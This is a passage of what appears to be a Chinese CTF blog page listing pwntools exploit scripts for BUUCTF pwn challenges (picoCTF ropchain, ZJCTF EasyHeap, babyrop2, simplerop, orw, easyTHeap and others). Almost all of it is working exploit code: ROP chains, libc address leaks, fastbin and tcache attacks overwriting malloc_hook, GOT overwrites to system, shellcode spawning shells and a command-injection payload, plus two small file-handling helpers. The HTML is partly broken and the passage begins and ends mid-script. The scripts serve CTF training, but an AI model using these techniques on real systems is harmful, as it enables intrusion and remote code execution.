&#x3D; libc_base + 0x846c0</span><br><span class="line">fake_chunk &#x3D; main_arean - 0x33</span><br><span class="line"></span><br><span class="line">add(0x60)</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">write(4,0x8,p64(fake_chunk))</span><br><span class="line"></span><br><span class="line">add(0x60)</span><br><span class="line">add(0x60)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;\x00&#39;*11 + p64(one[1]+libc_base)+p64(realloc+2)</span><br><span class="line">write(5,len(payload),payload)</span><br><span class="line"></span><br><span class="line">add(255)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-38-picoctf-2018-ropchain-sovle"><a href="#NO-38-picoctf-2018-ropchain-sovle" class="headerlink" title="NO.38 picoctf_2018_ropchain_sovle"></a>NO.38 picoctf_2018_ropchain_sovle</h1><h3 id="exp-38"><a href="#exp-38" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;picoctf_2018_rop chain&#39;)</span><br><span class="line">else:</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,28416)</span><br><span class="line">#elf &#x3D; ELF(&#39;picoctf_2018_rop chain&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line"></span><br><span class="line">win1 &#x3D; 0x080485CB</span><br><span class="line">win2 &#x3D; 0x080485D8</span><br><span class="line">win2_a1 &#x3D; 0xBAAAAAAD</span><br><span class="line"></span><br><span class="line">flag &#x3D; 0x0804862B</span><br><span class="line">flag_a1 &#x3D; 0xDEADBAAD</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x18+4)+p32(win1)+p32(win2)+p32(flag)+p32(win2_a1)+p32(flag_a1)</span><br><span class="line">p.recvuntil(&#39;input&gt; &#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-39-ZJCTF2019-Login-sovle"><a href="#NO-39-ZJCTF2019-Login-sovle" class="headerlink" title="NO.39 ZJCTF2019_Login_sovle"></a>NO.39 ZJCTF2019_Login_sovle</h1><h3 id="exp-39"><a href="#exp-39" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 1</span><br><span class="line">if local:</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;[ZJCTF 2019]Login&#39;)</span><br><span class="line">else:</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,25051)</span><br><span class="line">#elf &#x3D; ELF(&#39;[ZJCTF 2019]Login&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line"></span><br><span class="line">shell &#x3D; 0x00400E88</span><br><span class="line">p.recvuntil(&#39;Please enter username: &#39;)</span><br><span class="line">p.sendline(&#39;admin&#39;)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload &#x3D; &#39;2jctf_pa5sw0rd&#39;+&#39;\x00&#39;*58+p64(shell)</span><br><span class="line">p.recvuntil(&#39;Please enter password: &#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-40-jarvisoj-test-your-memory-sovle"><a href="#NO-40-jarvisoj-test-your-memory-sovle" class="headerlink" title="NO.40 jarvisoj_test_your_memory_sovle"></a>NO.40 jarvisoj_test_your_memory_sovle</h1><h3 id="exp-40"><a href="#exp-40" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;i386&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 1</span><br><span class="line">if local:</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;jarvisoj_test_your_memory&#39;)</span><br><span class="line">else:</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,)</span><br><span class="line">#elf &#x3D; ELF(&#39;jarvisoj_test_your_memory&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line">system &#x3D; 0x080485BD</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;------Test Your Memory!-------\n\n&#39;)</span><br><span class="line">s2 &#x3D; p.recvuntil(&#39;\n&#39;)[:-1]</span><br><span class="line">p.recvuntil(&#39;what???? : \n&#39;)</span><br><span class="line">hint &#x3D; int(p.recvuntil(&#39;\n&#39;),16)</span><br><span class="line">print(s2)</span><br><span class="line">print(hex(hint))</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload &#x3D; s2.ljust(0x13+4,&#39;a&#39;)</span><br><span class="line">print(payload)</span><br><span class="line">payload +&#x3D; p32(system) + p32(hint)+ p32(hint)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-41-ZJCTF2019-EasyHeap-sovle"><a href="#NO-41-ZJCTF2019-EasyHeap-sovle" class="headerlink" title="NO.41 ZJCTF2019_EasyHeap_sovle"></a>NO.41 ZJCTF2019_EasyHeap_sovle</h1><h3 id="exp-41"><a href="#exp-41" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 1</span><br><span class="line">if local:</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;[ZJCTF 2019]EasyHeap&#39;)</span><br><span class="line">else:</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,28811)</span><br><span class="line">elf &#x3D; ELF(&#39;[ZJCTF 2019]EasyHeap&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line">l64 &#x3D; lambda      :u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))</span><br><span class="line">l32 &#x3D; lambda      :u32(p.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,&quot;\x00&quot;))</span><br><span class="line">sla &#x3D; lambda a,b  :p.sendlineafter(str(a),str(b))</span><br><span class="line">sa  &#x3D; lambda a,b  :p.sendafter(str(a),str(b))</span><br><span class="line">lg  &#x3D; lambda name,data : p.success(name + &quot;: 0x%x&quot; % data)</span><br><span class="line">se  &#x3D; lambda payload: p.send(payload)</span><br><span class="line">rl  &#x3D; lambda      : p.recv()</span><br><span class="line">sl  &#x3D; lambda payload: p.sendline(payload)</span><br><span class="line">ru  &#x3D; lambda a     :p.recvuntil(str(a))</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">sla(&quot;Your choice :&quot;,str(1))</span><br><span class="line">sla(&quot;Size of Heap : &quot;,str(size))</span><br><span class="line">sla(&quot;Content of heap:&quot;,content)</span><br><span class="line"></span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">sla(&quot;Your choice :&quot;,str(2))</span><br><span class="line">sla(&quot;Index :&quot;,str(idx))</span><br><span class="line">sla(&quot;Size of Heap : &quot;,str(size))</span><br><span class="line">sla(&quot;Content of heap : &quot;,content)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">sla(&quot;Your choice :&quot;,str(3))</span><br><span class="line">sla(&quot;Index :&quot;,str(idx))</span><br><span class="line"></span><br><span class="line">l33t_addr &#x3D;  0x000400C23</span><br><span class="line"></span><br><span class="line">add(0x68,&#39;aaaaa&#39;)#0</span><br><span class="line">add(0x68,&#39;bbbbb&#39;)#1</span><br><span class="line">add(0x68,&#39;ccccc&#39;)#2</span><br><span class="line"></span><br><span class="line">dele(2)</span><br><span class="line">edit(1,0x78,&#39;&#x2F;bin&#x2F;sh\x00&#39;+&#39;\x00&#39;*0x60+p64(0x71)+p64(0x6020b0-3))</span><br><span class="line">add(0x68,&#39;ddddd&#39;)#2 </span><br><span class="line">add(0x68,&#39;eeeee&#39;)#3 ---&gt; 0x6020b0-3</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">edit(3,43 ,&#39;aaa&#39;+p64(0)*4+p64(elf.got[&#39;free&#39;]))</span><br><span class="line">edit(0,0x8,p64(elf.plt[&#39;system&#39;]))</span><br><span class="line">dele(1)</span><br><span class="line">p.interactive()&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># NO.42 file_change_time</span><br><span class="line"></span><br><span class="line">### exp</span><br></pre></td></tr></table></figure><h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding: utf-8 --"></a>-<em>- coding: utf-8 -</em>-</h1><p>import os<br>import sys<br>import time<br>import datetime</p><p>reload(sys)<br>sys.setdefaultencoding(‘utf8’)<br>d1 = datetime.datetime.strptime(‘2020-08-01 00:00:00’, ‘%Y-%m-%d %H:%M:%S’)<br>d2 = datetime.datetime.strptime(‘2020-08-30 23:59:59’, ‘%Y-%m-%d %H:%M:%S’)</p><p>print(d1&gt;d2)<br>path = u”/home/dj/桌面/temp/Buu pwn”<br>for root, dir, files in os.walk(path):<br>    for file in files:<br>        full_path = os.path.join(root, file)<br>        mtime = os.stat(full_path).st_mtime<br>        time.strftime(‘%Y-%m-%d’, time.localtime(mtime))<br>        file_modify_time = time.strftime(‘%Y-%m-%d %H:%M:%S’, time.localtime(mtime))<br>        file_modify_time_format = datetime.datetime.strptime(file_modify_time, ‘%Y-%m-%d %H:%M:%S’)<br>        if file_modify_time_format &gt;= d1 and file_modify_time_format &lt;= d2:<br>            print(“{0} 修改时间是: {1}”.format(full_path,file_modify_time_format))</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># NO.43 ciscn_2019_n_3_sovle</span><br><span class="line"></span><br><span class="line">### exp</span><br></pre></td></tr></table></figure><p>#-<em>- coding:utf-8-</em>-<br>from pwn import *<br>from LibcSearcher import *<br>context(os=”linux”, arch=”amd64”, log_level=”debug”)<br>local = 1<br>if local:<br>    p = process(‘./ciscn_2019_n_3’)<br>else:<br>    p = remote(‘node3.buuoj.cn’,28300)<br>elf = ELF(‘ciscn_2019_n_3’)<br>#libc = ELF(‘/lib/x86_64-linux-gnu/libc.so.6’)</p><p>def newnote(idx,type,value,length=0):<br>    p.recvuntil(“CNote &gt; “)<br>    p.sendline(str(1))<br>    p.recvuntil(“Index &gt; “)<br>    p.sendline(str(idx))<br>    p.recvuntil(“Type &gt; “)<br>    p.sendline(str(type))<br>    if type == 1:<br>        p.recvuntil(“Value &gt; “)<br>        p.sendline(str(value))<br>    else:<br>            p.recvuntil(“Length &gt; “)<br>            p.sendline(str(length))<br>            p.recvuntil(“Value &gt; “)<br>            if length == 8:<br>                p.send(value)<br>            else:<br>                p.sendline(value)<br>def delnote(idx):<br>    p.recvuntil(“CNote &gt; “)<br>    p.sendline(str(2))<br>    p.recvuntil(“Index &gt; “)<br>    p.sendline(str(idx))</p><p>newnote(0,2,’a’<em>10,0x88)<br>newnote(1,2,’a’</em>10,0x38)<br>#gdb.attach(p)<br>newnote(2,1,0x41)<br>delnote(1)<br>delnote(2)<br>#gdb.attach(p)<br>newnote(3,2,’sh\x00\x00’+p32(elf.plt[‘system’]),0xc)<br>delnote(1)</p><p>p.interactive()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># NO.44 bjdctf_2020_babyrop2_sovle</span><br><span class="line"></span><br><span class="line">### exp</span><br></pre></td></tr></table></figure><p>#-<em>- coding:utf-8-</em>-<br>from pwn import *<br>from LibcSearcher import *<br>context(os=”linux”, arch=”amd64”, log_level=”debug”)<br>local = 1<br>if local:<br>    p = process(‘./bjdctf_2020_babyrop2’)<br>else:<br>    p = remote(‘node3.buuoj.cn’,28559)<br>elf = ELF(‘bjdctf_2020_babyrop2’)<br>libc = ELF(‘/lib/x86_64-linux-gnu/libc.so.6’)</p><p>sh_addr = 0x004003EF<br>pop_rdi = 0x0000000000400993<br>vuln = 0x000400887<br>puts_plt = elf.plt[‘puts’]<br>puts_got = elf.got[‘puts’]</p><p>p.recvuntil(‘!\n’)<br>payload = “%7$p”<br>#gdb.attach(p)<br>p.sendline(payload)<br>p.recvuntil(‘!\n’)<br>carry = int(p.recvuntil(‘\n’),16)</p><p>payload = ‘a’*(0x20-0x9+1)+p64(carry)+’aaaaaaaa’<br>payload += p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln)<br>p.recvuntil(‘!\n’)<br>p.sendline(payload)<br>puts_addr = u64(p.recvuntil(‘\n’)[:-1].ljust(8,’\x00’))</p><p>offset = puts_addr - libc.sym[‘puts’]<br>system = offset + libc.sym[‘system’]</p><p>p.recvuntil(‘!\n’)<br>payload = ‘a’*(0x20-0x9+1)+p64(carry)+’aaaaaaaa’<br>payload += p64(pop_rdi)+p64(sh_addr)+p64(system)<br>p.sendline(payload)<br>p.interactive()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># NO.45 cmcc_simplerop_sovle</span><br><span class="line"></span><br><span class="line">### exp</span><br></pre></td></tr></table></figure><p>#-<em>- coding:utf-8-</em>-<br>from pwn import *<br>from LibcSearcher import *<br>context(os=”linux”, arch=”i386”, log_level=”debug”)<br>local = 0<br>if local:<br>    p = process(‘./cmcc_simplerop’)<br>else:<br>    p = remote(‘node3.buuoj.cn’,28194)<br>elf = ELF(‘cmcc_simplerop’)<br>#libc = ELF(‘/lib/x86_64-linux-gnu/libc.so.6’)<br>bss_addr = 0x080EC2C0<br>int80 = 0x080493e1<br>pop_edx_ecx_ebx = 0x0806e850<br>pop_eax = 0x080bae06<br>read_addr= 0x0806CD50<br>payload = ‘a’*(0x20)+p32(read_addr)+p32(pop_edx_ecx_ebx)<br>payload += p32(0)+p32(bss_addr)+p32(8)<br>payload += p32(pop_edx_ecx_ebx)+p32(0)+p32(0)+p32(bss_addr)+p32(pop_eax)+p32(11)+p32(int80)</p><p>#gdb.attach(p)<br>p.sendlineafter(‘Your input :’,payload)<br>p.sendline(‘/bin/sh\x00’)</p><p>p.interactive()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># NO.46 bjdctf_2020_router_sovle</span><br><span class="line"></span><br><span class="line">### exp</span><br></pre></td></tr></table></figure><p>#-<em>- coding:utf-8-</em>-<br>from pwn import *<br>from LibcSearcher import *<br>context(os=”linux”, arch=”amd64”, log_level=”debug”)<br>local = 0<br>if local:<br>    p = process(‘./bjdctf_2020_router’)<br>else:<br>    p = remote(‘node3.buuoj.cn’,27872)<br>#elf = ELF(‘’)<br>#libc = ELF(‘/lib/x86_64-linux-gnu/libc.so.6’)</p><p>payload = ‘ ‘+’&amp; cat flag’<br>p.sendlineafter(“Please input u choose:\n”,’1’)<br>p.sendlineafter(“Please input the ip address:\n”,payload)</p><p>p.interactive()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># NO.47 PicoCTF_2018_buffer_overflow_1_sovle</span><br><span class="line"></span><br><span class="line">### exp</span><br></pre></td></tr></table></figure><p>#-<em>- coding:utf-8-</em>-<br>from pwn import *<br>from LibcSearcher import *<br>context(os=”linux”, arch=”i386”, log_level=”debug”)<br>local = 0<br>if local:<br>    p = process(‘./PicoCTF_2018_buffer_overflow_1’)<br>else:<br>    p = remote(‘node3.buuoj.cn’,29582)<br>elf = ELF(‘PicoCTF_2018_buffer_overflow_1’)<br>#libc = ELF(‘/lib/x86_64-linux-gnu/libc.so.6’)</p><p>l64 = lambda      :u64(p.recvuntil(“\x7f”)[-6:].ljust(8,”\x00”))<br>l32 = lambda      :u32(p.recvuntil(“\xf7”)[-4:].ljust(4,”\x00”))<br>sla = lambda a,b  :p.sendlineafter(str(a),str(b))<br>sa  = lambda a,b  :p.sendafter(str(a),str(b))<br>lg  = lambda name,data : p.success(name + “: 0x%x” % data)<br>se  = lambda payload: p.send(payload)<br>rl  = lambda      : p.recv()<br>sl  = lambda payload: p.sendline(payload)<br>ru  = lambda a     :p.recvuntil(str(a))</p><p>flag = 0x080485CB<br>sla(‘string: \n’,’a’*(0x28+4)+p32(flag))<br>#gdb.attach(p)</p><p>p.interactive()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># NO.48 jarvisoj_level1_sovle</span><br><span class="line"></span><br><span class="line">### exp</span><br></pre></td></tr></table></figure><p>#-<em>- coding:utf-8-</em>-<br>from pwn import *<br>from LibcSearcher import *<br>context(os=”linux”, arch=”i386”, log_level=”debug”)<br>local = 0<br>if local:<br>    p = process(‘./jarvisoj_level1’)<br>else:<br>    p = remote(‘node3.buuoj.cn’,29143)<br>elf = ELF(‘jarvisoj_level1’)<br>#libc = ELF(‘/lib/x86_64-linux-gnu/libc.so.6’)<br>o_g = [0x45226,0x4527a,0xf0364,0xf1207]<br>magic = [0x3c4b10,0x3c67a8,0x846c0,0x45390]#malloc,free,realloc,system<br>l64 = lambda      :u64(p.recvuntil(“\x7f”)[-6:].ljust(8,”\x00”))<br>l32 = lambda      :u32(p.recvuntil(“\xf7”)[-4:].ljust(4,”\x00”))<br>sla = lambda a,b  :p.sendlineafter(str(a),str(b))<br>sa  = lambda a,b  :p.sendafter(str(a),str(b))<br>lg  = lambda name,data : p.success(name + “: 0x%x” % data)<br>se  = lambda payload: p.send(payload)<br>rl  = lambda      : p.recv()<br>sl  = lambda payload: p.sendline(payload)<br>ru  = lambda a     :p.recvuntil(str(a))<br>shellcode = asm(shellcraft.sh())</p><p>bss = 0x0804A028<br>vuln = 0x0804847B</p><p>‘’’本地<br>buf = rl()[-12:-2]<br>#print buf<br>payload = shellcode.ljust(0x88+4,’\x00’)+p32(int(buf,16))<br>#gdb.attach(p)<br>sl(payload)<br>‘’’<br>payload = shellcode.ljust(0x88+4,’a’)+p32(elf.plt[‘write’])+p32(vuln)<br>payload += p32(1)+p32(elf.got[‘read’])+p32(4)<br>se(payload)<br>read = l32()<br>#print hex(read)</p><p>libc = LibcSearcher(‘read’,read)<br>offset = read - libc.dump(‘read’)<br>system = libc.dump(‘system’)+offset<br>binsh = libc.dump(‘str_bin_sh’)+offset</p><p>payload = ‘a’*(0x88+4)+p32(system)+p32(vuln)+p32(binsh)<br>se(payload)</p><p>p.interactive()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># NO.49 pwnable_orw_sovle</span><br><span class="line"></span><br><span class="line">### exp</span><br></pre></td></tr></table></figure><p>#-<em>- coding:utf-8-</em>-<br>from pwn import *<br>from LibcSearcher import *<br>context(os=”linux”, arch=”amd64”, log_level=”debug”)<br>local = 0<br>if local:<br>    p = process(‘./pwnable_orw’)<br>else:<br>    p = remote(‘node3.buuoj.cn’,29270)<br>#elf = ELF(‘pwnable_orw’)<br>#libc = ELF(‘/lib/x86_64-linux-gnu/libc.so.6’)<br>o_g = [0x45226,0x4527a,0xf0364,0xf1207]<br>magic = [0x3c4b10,0x3c67a8,0x846c0,0x45390]#malloc,free,realloc,system<br>l64 = lambda      :u64(p.recvuntil(“\x7f”)[-6:].ljust(8,”\x00”))<br>l32 = lambda      :u32(p.recvuntil(“\xf7”)[-4:].ljust(4,”\x00”))<br>sla = lambda a,b  :p.sendlineafter(str(a),str(b))<br>sa  = lambda a,b  :p.sendafter(str(a),str(b))<br>lg  = lambda name,data : p.success(name + “: 0x%x” % data)<br>se  = lambda payload: p.send(payload)<br>rl  = lambda      : p.recv()<br>sl  = lambda payload: p.sendline(payload)<br>ru  = lambda a     :p.recvuntil(str(a))</p><p>shellcode = shellcraft.open(‘/flag’)<br>shellcode += shellcraft.read(‘eax’,’esp’,100)<br>shellcode += shellcraft.write(1,’esp’,100)</p><p>payload = ‘’’<br>push 0x0<br>push 0x67616c66<br>mov ebx,esp<br>xor ecx,ecx<br>xor edx,edx<br>mov eax,0x5<br>int 0x80<br>nop<br>add esp,8<br>mov ebx,0x3<br>mov ecx,esp<br>mov edx,42<br>mov eax,0x3<br>int 0x80<br>nop<br>mov ebx,0x1<br>mov ecx,esp<br>mov edx,42<br>mov eax,0x4<br>int 0x80<br>‘’’</p><p>sla(‘Give my your shellcode:’,asm(payload))</p><p>p.interactive()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># NO.50 VN2020公开赛_easyTHeap_sovle</span><br><span class="line"></span><br><span class="line">### exp</span><br></pre></td></tr></table></figure><p>#-<em>- coding:utf-8-</em>-<br>from pwn import *<br>#from LibcSearcher import *<br>context(os=”linux”, arch=”amd64”, log_level=”debug”)<br>local = 1<br>if local:<br>    p = process(‘./[V&amp;N2020 公开赛]easyTHeap’,env={“LD_PRELOAD”:”./libc/ubuntu18/64/libc-2.27.so”})<br>else:<br>    p = remote(‘node3.buuoj.cn’,25597)<br>elf = ELF(‘[V&amp;N2020 公开赛]easyTHeap’)<br>libc = ELF(‘./libc/ubuntu18/64/libc-2.27.so’)<br>o_g = [0x45226,0x4527a,0xf0364,0xf1207]<br>magic = [0x3c4b10,0x3c67a8,0x846c0,0x45390]#malloc,free,realloc,system<br>l64 = lambda      :u64(p.recvuntil(“\x7f”)[-6:].ljust(8,”\x00”))<br>l32 = lambda      :u32(p.recvuntil(“\xf7”)[-4:].ljust(4,”\x00”))<br>sla = lambda a,b  :p.sendlineafter(str(a),str(b))<br>sa  = lambda a,b  :p.sendafter(str(a),str(b))<br>lg  = lambda name,data : p.success(name + “: 0x%x” % data)<br>se  = lambda payload: p.send(payload)<br>rl  = lambda      : p.recv()<br>sl  = lambda payload: p.sendline(payload)<br>ru  = lambda a     :p.recvuntil(str(a))<br>#shellcode = asm(shellcraft.sh())<br>‘’’<br>ubuntu18<br>‘’’<br>def add(size):<br>    sla(‘choice: ‘,str(1))<br>    sla(‘size?’,str(size))<br>def edit(idx,content):<br>    sla(‘choice: ‘,str(2))<br>    sla(‘idx?’,str(idx))<br>    sla(‘content:’,content)<br>def show(idx):<br>    sla(‘choice: ‘,str(3))<br>    sla(‘idx?’,str(idx))<br>def dele(idx):<br>    sla(‘choice: ‘,str(4))<br>    sla(‘idx?’,str(idx))</p><p>add(0x50) #0<br>dele(0)<br>dele(0)<br>show(0)<br>heap_base = u64(p.recvuntil(‘\n’, drop = True).ljust(8, ‘\x00’))<br>print hex(heap_base)<br>add(0x50) #1</p><p>edit(1, p64(heap_base - 0x250))<br>add(0x50) #2<br>add(0x50) #3 tcache struct<br>#gdb.attach(p)<br>edit(3,’a’<em>0x38)<br>dele(3)<br>show(3)<br>libc_base = l64()-0x3ebca0<br>print hex(libc_base)<br>malloc_hook = libc_base + libc.sym[‘<strong>malloc_hook’]<br>realloc = libc_base + libc.sym[‘</strong>libc_realloc’]<br>one = libc_base + 0x4f322<br>print hex(malloc_hook),hex(realloc),hex(one)<br>add(0x50) #4<br>gdb.attach(p)<br>edit(4,’b’</em>0x48+p64(malloc_hook-0x13))<br>add(0x20) #5<br>edit(5,’\x00’*11+p64(one)+p64(realloc+8))<br>add(0x10)<br>p.sendline(‘cat flag’)<br>p.interactive()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># NO.51 1file_move</span><br><span class="line"></span><br><span class="line">### exp</span><br></pre></td></tr></table></figure><p>#-<em>- coding:utf-8-</em>-<br>import os<br>import shutil<br>import sys<br>path = u”/home/dj/桌面/temp/Buu pwn”<br>a = 0<br>for root, dir, files in os.walk(path):<br>    for file in files:<br>        if(“.py” not in file and “.so” not in file and 